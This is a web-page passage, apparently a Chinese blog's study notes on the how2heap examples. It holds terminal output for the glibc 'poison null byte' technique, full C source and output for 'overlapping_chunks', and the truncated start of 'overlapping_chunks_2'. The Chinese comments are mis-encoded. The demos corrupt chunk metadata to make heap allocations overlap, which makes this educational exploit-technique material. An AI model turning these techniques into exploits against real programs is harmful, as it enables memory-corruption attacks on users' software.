./poison_null_byte<br>Welcome to poison null byte <span class="hljs-number">2.0</span>!<br>Tested in Ubuntu <span class="hljs-number">16.04</span> <span class="hljs-number">64b</span>it.<br>This technique only works with disabled tcache-option <span class="hljs-keyword">for</span> glibc, see build_glibc.sh <span class="hljs-keyword">for</span> build instructions.<br>This technique can be used when you have an off-by-one into a <span class="hljs-built_in">malloc</span><span class="hljs-number">&#x27;</span>ed region with a null byte.<br>We allocate <span class="hljs-number">0x100</span> bytes <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;a&#x27;</span>.<br>a: <span class="hljs-number">0xe29010</span><br>Since we want to overflow <span class="hljs-string">&#x27;a&#x27;</span>, we need to know the <span class="hljs-string">&#x27;real&#x27;</span> size of <span class="hljs-string">&#x27;a&#x27;</span> (it may be more than <span class="hljs-number">0x100</span> because of rounding): <span class="hljs-number">0x108</span><br>b: <span class="hljs-number">0xe29120</span><br>c: <span class="hljs-number">0xe29330</span><br>We allocate a barrier at <span class="hljs-number">0xe29440</span>, so that c is not consolidated with the top-chunk when freed.<br>The barrier is not strictly necessary, but makes things less confusing<br>In newer versions of glibc we will need to have our updated size inside b itself to pass the check <span class="hljs-string">&#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;</span><br>b.size: <span class="hljs-number">0x211</span><br>b.size is: (<span class="hljs-number">0x200</span> + <span class="hljs-number">0x10</span>) | prev_in_use<br>We overflow <span class="hljs-string">&#x27;a&#x27;</span> with a single null byte into the metadata of <span class="hljs-string">&#x27;b&#x27;</span><br>b.size: <span class="hljs-number">0x200</span><br>c.prev_size is <span class="hljs-number">0x210</span><br>We will pass the check since <span class="hljs-title function_">chunksize</span><span class="hljs-params">(P)</span> == <span class="hljs-number">0x200</span> == <span class="hljs-number">0x200</span> == prev_size (next_chunk(P))<br>b1: <span class="hljs-number">0xe29120</span><br>Now we <span class="hljs-built_in">malloc</span> <span class="hljs-string">&#x27;b1&#x27;</span>. It will be placed where <span class="hljs-string">&#x27;b&#x27;</span> was. At this point c.prev_size should have been updated, but it was not: <span class="hljs-number">0x210</span><br>Interestingly, the updated value of c.prev_size has been written <span class="hljs-number">0x10</span> bytes before c.prev_size: f0<br>We <span class="hljs-built_in">malloc</span> <span class="hljs-string">&#x27;b2&#x27;</span>, our <span class="hljs-string">&#x27;victim&#x27;</span> chunk.<br>b2: <span class="hljs-number">0xe29230</span><br>Current b2 content:<br>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br>Now we <span class="hljs-built_in">free</span> <span class="hljs-string">&#x27;b1&#x27;</span> and <span class="hljs-string">&#x27;c&#x27;</span>: this will consolidate the chunks <span class="hljs-string">&#x27;b1&#x27;</span> and <span class="hljs-string">&#x27;c&#x27;</span> (forgetting about <span class="hljs-string">&#x27;b2&#x27;</span>).<br>Finally, we allocate <span class="hljs-string">&#x27;d&#x27;</span>, overlapping <span class="hljs-string">&#x27;b2&#x27;</span>.<br>d: <span class="hljs-number">0xe29120</span><br>Now <span class="hljs-string">&#x27;d&#x27;</span> and <span class="hljs-string">&#x27;b2&#x27;</span> overlap.<br>New b2 content:<br>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD<br>Thanks to https:<span class="hljs-comment">//www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.</span><br></code></pre></td></tr></table></figure><h2 id="Overlapping"><a href="#Overlapping" class="headerlink" title="Overlapping"></a>Overlapping</h2><h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><p>ä»unsortedbinä¸­å–å‡ºchunkçš„æ—¶å€™ï¼Œåªä¼šç®€å•çš„æ£€æŸ¥å…¶sizeæ˜¯å¦åœ¨åˆç†çš„èŒƒå›´ä¹‹å†…ï¼Œè€Œä¸ä¼šå»æ£€æŸ¥å’Œå½“å‰binsçš„æ ‡å¿—å¤§å°æ˜¯å¦ç›¸åŒï¼Œæ‰€ä»¥å½“æˆ‘ä»¬å–å‡ºçš„chunkç¬¦åˆè¦æ±‚å°±ä¼šè¿”è¿˜ç»™æˆ‘ä»¬ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ‰©å±•å·²é‡Šæ”¾çš„å †å—</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> A simple tale of overlapping chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> This technique is taken from</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span>&#123;<br><br><br><br><br><br><span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4;<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);<br><br><br><br>p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br>p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br>p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);<br><br><br><br><span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(p2);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);<br><br><br><span class="hljs-comment">// å‡è®¾æœ‰ä¸€ä¸ªå †æº¢å‡ºæ¼æ´èƒ½å¤Ÿæ”¹å†™å †å—p2çš„å¤§å°</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span><br><span class="hljs-comment">// æˆ‘ä»¬æœ€å¥½è¿˜æ˜¯ä¿ç•™å †å—çš„æ ‡å¿—ä½</span><br><span class="hljs-string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span><br><span class="hljs-comment">// é˜²æ­¢å †å—p1è¢«è¯¯è®¤ä¸ºé‡Šæ”¾çš„chunk</span><br><span class="hljs-string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);<br><br><br><br><span class="hljs-type">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<span class="hljs-comment">// æ¶æ„çš„chunkçš„size</span><br><br><span class="hljs-type">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<span class="hljs-comment">// æˆ‘ä»¬è¯·æ±‚çš„chunkçš„å¤§å°</span><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,<br><br> evil_chunk_size, evil_region_size);<br><br><br><span class="hljs-comment">// ä¿®æ”¹å †å—p2çš„å¤§å°ä¸ºæ¶æ„çš„size</span><br>*(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// we are overwriting the &quot;size&quot; field of chunk p2</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span><br><br>       <span class="hljs-string">&quot;size of the chunk p2 injected size\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span><br><br>       <span class="hljs-string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);<br><br>p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br><br><span class="hljs-comment">// p4å¼€å§‹çš„ä½ç½®å’Œç»“æŸçš„ä½ç½®</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p4, (<span class="hljs-type">char</span> *)p4+evil_region_size);<br><span class="hljs-comment">// p3å¼€å§‹çš„ä½ç½®å’Œç»“æŸçš„ä½ç½®</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p3, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);<br><br><br><span class="hljs-comment">// é€ æˆå †å—é‡å </span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span><br><br><span class="hljs-string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);<br><br><span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);<br><br><span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/overlapping$ ./overlapping_chunks<br><br>This is a simple chunks overlapping problem<br><br>Let<span class="hljs-number">&#x27;</span>s start to allocate <span class="hljs-number">3</span> chunks on the heap<br>The <span class="hljs-number">3</span> chunks have been allocated here:<br>p1=<span class="hljs-number">0x24e4010</span><br>p2=<span class="hljs-number">0x24e4110</span><br>p3=<span class="hljs-number">0x24e4210</span><br><br>Now let<span class="hljs-number">&#x27;</span>s <span class="hljs-built_in">free</span> the chunk p2<br>The chunk p2 is now in the unsorted bin ready to serve possible<br>new <span class="hljs-built_in">malloc</span>() of its size<br>Now let<span class="hljs-number">&#x27;</span>s simulate an overflow that can overwrite the size of the<br>chunk freed p2.<br>For a toy program, the value of the last <span class="hljs-number">3</span> bits is unimportant; however, it is best to maintain the stability of the heap.<br>To achieve this stability we will mark the least signifigant bit as <span class="hljs-number">1</span> (prev_inuse), to assure that p1 is not mistaken <span class="hljs-keyword">for</span> a <span class="hljs-built_in">free</span> chunk.<br>We are going to <span class="hljs-built_in">set</span> the size of chunk p2 to to <span class="hljs-number">385</span>, which gives us<br>a region size of <span class="hljs-number">376</span><br><br>Now let<span class="hljs-number">&#x27;</span>s allocate another chunk with a size equal to the data<br>size of the chunk p2 injected size<br>This <span class="hljs-built_in">malloc</span> will be served from the previously freed chunk that<br>is parked in the unsorted bin which size has been modified by us<br><br>p4 has been allocated at <span class="hljs-number">0x24e4110</span> and ends at <span class="hljs-number">0x24e4288</span><br>p3 starts at <span class="hljs-number">0x24e4210</span> and ends at <span class="hljs-number">0x24e4288</span><br>p4 should overlap with p3, in this <span class="hljs-keyword">case</span> p4 includes all p3.<br><br>Now everything copied inside chunk p4 can overwrites data on<br>chunk p3, and data written to chunk p3 can overwrite data<br>stored in the p4 chunk.<br><br>Let<span class="hljs-number">&#x27;</span>s run through an example. Right now, we have:<br>p4 = xï¿½ï¿½ï¿½ï¿½<br>p3 = <span class="hljs-number">333333333333333333333333333333333333333333333333333333333333333333333333333</span><span class="hljs-number">33333333333333333333333333333333333333333333</span>ï¿½<br><br>If we <span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-number">376</span>), we have:<br>p4 = <span class="hljs-number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</span><span class="hljs-number">444444444444444444444444444444444444444444444444444444444444</span>ï¿½<br>p3 = <span class="hljs-number">444444444444444444444444444444444444444444444444444444444444444444444444444</span><span class="hljs-number">44444444444444444444444444444444444444444444</span>ï¿½<br><br>And <span class="hljs-keyword">if</span> we then <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>), we have:<br>p4 = <span class="hljs-number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444433333333333333333333333333333333333333333333333333333333333</span><span class="hljs-number">333333333333333333334444444444444444444444444444444444444444</span>ï¿½<br>p3 = <span class="hljs-number">333333333333333333333333333333333333333333333333333333333333333333333333333</span><span class="hljs-number">33334444444444444444444444444444444444444444</span>ï¿½<br></code></pre></td></tr></table></figure><h3 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h3><p>æ‰©å±•å·²åˆ†é…çš„å †å—ä¸»è¦è€ƒè™‘åˆ°å †å—çš„é‡Šæ”¾ï¼Œä¸»è¦åˆ†ä¸ºå‘å‰åˆå¹¶å’Œå‘ååˆå¹¶ã€‚å‘å‰åˆå¹¶å³æ˜¯å‘é«˜åœ°å€çš„chunkåˆå¹¶ï¼Œä¸»è¦é€šè¿‡<code>size</code>ä½æ¥è·å–ï¼›å‘ååˆå¹¶å³æ˜¯å‘ä½åœ°å€çš„chunkåˆå¹¶ï¼Œä¸»è¦é€šè¿‡<code>prev_size</code>æ¥è·å–ã€‚å½“æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶è¿™ä¸¤ä¸ªæ ‡å¿—ï¼Œå°±èƒ½æ§åˆ¶åˆå¹¶å †å—çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> Yet another simple tale of overlapping chunk.</span><br><span class="hljs-comment">æ‰©å±•æœªé‡Šæ”¾çš„å †å—</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> This technique is taken from</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>  <br><br>  <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br><br>  <span class="hljs-type">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis is a simple chunks overlapping 